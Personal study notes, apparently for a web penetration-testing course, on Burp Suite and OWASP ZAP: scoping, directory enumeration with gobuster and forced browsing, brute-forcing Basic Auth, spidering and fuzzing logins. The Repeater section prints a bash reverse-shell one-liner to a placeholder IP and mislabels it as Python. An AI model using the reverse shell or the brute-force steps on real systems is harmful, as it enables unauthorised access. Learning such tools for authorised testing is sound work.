![[Pasted image 20241110224615.png]]

### Web Proxy vs Web Proxy Server
![[Pasted image 20241110232331.png]]
![[Pasted image 20241110232756.png]]
![[Pasted image 20241110233158.png]]
![[Pasted image 20241110235020.png]]

# Burp Suite
![[Pasted image 20241111103615.png]]
### Burp Target & Scope
![[Pasted image 20241111122631.png]]
![[Pasted image 20241111122755.png]]

**Site Map**
![[Pasted image 20241111122912.png]]

To get all the subdomains in the Sitemap section we can use something like : 
	![[Pasted image 20241111123915.png]]
	So, we need to add the Host or IP Range according to the given image int our Target Scope Section, enabling the Use Advanced Scope Control Option.



### Burp Suite Intruder
![[Pasted image 20241111154323.png]]
![[Pasted image 20241111154538.png]]

If we want to enumerate directories present in the website we could do the following with the HTTP Header : 
![[Pasted image 20241111235715.png]]
And then add the wordlist as a Simple List as the payload.

### Attacking Basic Auth with Intruder & Encoder
First we need to check what type of service the IP Address is running which can be done by using the command : `nmap -sV -p 80 ip_address`
Now, in order to perform directory enumeration we can use Burp Suite, but to rate limiting factor, we will use a tool like gobuster using that command : `gobuster dir --url http://ipaddress --wordlist /usr/share/wordlists/dirb/common.txt`

The error like 401 on the Apache Server is just like an Authentication Form that we need to bypass is order to extract information or find vulnerabilities
And on getting that request using Interceptor on Burp, we can see that there will be a request with header **Authorization:** 
![[Pasted image 20241119230612.png]]
Now, here we can suspect that it is a Base64 encoded string
We used a Sniper Attack.
Here, we cannot supply directly the username and password, we need to do Payload Processing here, in order to make it of the format - `username:password`


### Burp Suite Repeater
![[Pasted image 20241119231341.png]]

A basic TCP Reverse Shell that works on Python Interpreter : `bash -i >& /dev/tcp/ip_addess/4444 0>&1`


# OWASP ZAP
It is the most popular open source and free standard web proxy and scanner developed in Java.
Features - 
- intercepting requests and responses
- automated web application scanning - passive and active
- we spidering - active spidering
- fully fledged intruder functionality
- extensive collection of add-ons

To install ZAP on Kali, we can get that on the repo itself : `sudo apt-get install zaproxy -y`

### ZAP Context & Scope
First, you need to switch to Protected Mode from Standard Mode.
Right click onto Default Context and add the website to be in-scoped over there.
Then switch on the Bulls-Eye Option to hide all the other websites except the websites in scope.
And if we want that any subdomains need to be in scope too, then we could just add : `*.domain.com `

### Directory Enumeration with OWASP ZAP
To do that we need to - Manual Explore and put the URL to explore and launch the Browser.
Then right click on the Site Folder and Under Attack run the Forced Browser Directory (and Children) Attack on it.
And in the Option go to Forced Browse and change the Concurrent Scanning Threads for faster performance.
And then in the Forced Browse Menu that opened in the bottom of the explorer, put a file for the dictionary.

### Web App Scanning
First do a Service Version Scan using NMAP, to know that which services are running on the given host, using the command : `nmap -F -sV <ip-address>`
Then run the manual scan and start to iterate over to other links checking for different vulnerabilities and stuff.
And we would working on the Login Authentication, then we could include it in the Default Context and then go to Authentication and shift that to Form-based Authentication.
Then we could start the Spider Attack on a given URL. And we could also perform Authenticated Spider by adding the User Credentials if we got any.
In the Alerts tab, we'll get common vulnerabilities present in the web applications.

### Spidering
- Spider is a tool that is used to automatically discover new resources (URLs) on a particular site.
- It begins with a list or URLs to visit, called the seeds, which depends on how the Spider is started.
- The Spider then visits these URLs, it identifies all the hyperlinks in the page and adds them to the list of URLs to visit and the process continues recursively as long as new resources are found.
- This can be used to identify hidden or unknown files, directories or end-points that may not have been visible or identifiable via a directory brute-force attack.

### Attacking HTTP Login Forms
Right click on the Request Body and select Fuzzer to open up the Intruder.
And then we first remove the selected fuzzing points and add the actual one and insert whatever type of content we want to.